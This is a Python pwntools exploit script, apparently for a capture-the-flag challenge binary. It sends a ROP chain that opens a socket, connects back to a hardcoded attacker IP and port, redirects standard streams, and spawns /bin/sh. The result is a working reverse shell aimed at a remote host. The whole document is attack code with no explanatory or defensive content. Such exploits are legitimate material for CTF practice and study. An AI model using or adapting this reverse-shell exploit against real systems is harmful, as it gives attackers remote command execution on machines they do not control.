#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.160.212.3', 1470

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x401805

# syscall; ret
break *0x414986
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)

    pop_rdi = 0x0000000000401f0f
    pop_rcx = 0x000000000045028b
    pop_rax = 0x0000000000447fa7
    pop_rsi = 0x0000000000409f7e
    pop_rdx_rbx = 0x000000000047f12b
    mov_rax_ptr_rdi = 0x0000000000493064 # : mov rax, qword ptr [rdi + 0x90] ; ret
    mov_ptr_rdi_rcx = 0x000000000043c58c # : mov qword ptr [rdi + 0x10], rcx ; ret
    syscall_ret = rop.find_gadget(["syscall", "ret"])[0]

    att_ip = u32(socket.inet_aton("20.40.74.245"))
    att_port = socket.htons(9001)

    bss = elf.bss() + 0x100
    sockaddr_addr = bss
    binsh_addr = bss + 0x200
    argv_addr = bss + 0x300

    payload = flat({
        0x10: [
            # locally need to reopen the descriptors but not remotely somehow

            # pop_rdi, bss-0x10,
            # pop_rcx, u64('/dev/pts'),
            # mov_ptr_rdi_rcx,
            
            # pop_rdi, bss-0x10+0x8,
            # pop_rcx, u64('/2'.ljust(8, '\x00')),
            # mov_ptr_rdi_rcx,

            # # open("/dev/pts/?", O_RDWR)
            # pop_rax, 0x2,
            # pop_rdi, bss,
            # pop_rsi, 0x2,
            # pop_rdx_rbx, 0x0, 0x0,
            # syscall_ret,

            # pop_rax, 0x2,
            # syscall_ret,

            # pop_rax, 0x2,
            # syscall_ret,

            pop_rdi, bss - 0x10,
            pop_rcx, (p16(2), p16(att_port), p32(att_ip)),
            mov_ptr_rdi_rcx,

            # socket(AF_INET, SOCK_STREAM, 0)
            pop_rax, 41,              # syscall: socket
            pop_rdi, 2,               # AF_INET
            pop_rsi, 1,               # SOCK_STREAM
            pop_rdx_rbx, 0, 0,
            syscall_ret,

            # connect(sockfd, sockaddr, 16)
            pop_rsi, sockaddr_addr,
            pop_rdx_rbx, 16, 0,
            pop_rdi, 0,              
            pop_rax, 42,
            syscall_ret,

            # dup2(fd, 0), dup2(fd, 1), dup2(fd, 2)
            pop_rsi, 0,
            pop_rax, 33,
            syscall_ret,

            pop_rsi, 1,
            pop_rax, 33,
            syscall_ret,

            pop_rsi, 2,
            pop_rax, 33,
            syscall_ret,
            
            # execve("/bin/sh", ["/bin/sh", NULL], NULL)
            pop_rdi, binsh_addr - 0x10,
            pop_rcx, u64(b"/bin/sh\x00"),
            mov_ptr_rdi_rcx,

            pop_rdi, argv_addr - 0x10,
            pop_rcx, binsh_addr,
            mov_ptr_rdi_rcx,

            pop_rax, 59,
            pop_rdi, binsh_addr,
            pop_rsi, argv_addr,
            pop_rdx_rbx, 0, 0,
            syscall_ret
        ]
    })

    io.sendline(payload)

    log.info('bss: %#x', bss)
    log.info('sockaddr_addr: %#x', sockaddr_addr)
    log.info('binsh_addr: %#x', binsh_addr)
    log.info('argv_addr: %#x', argv_addr)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
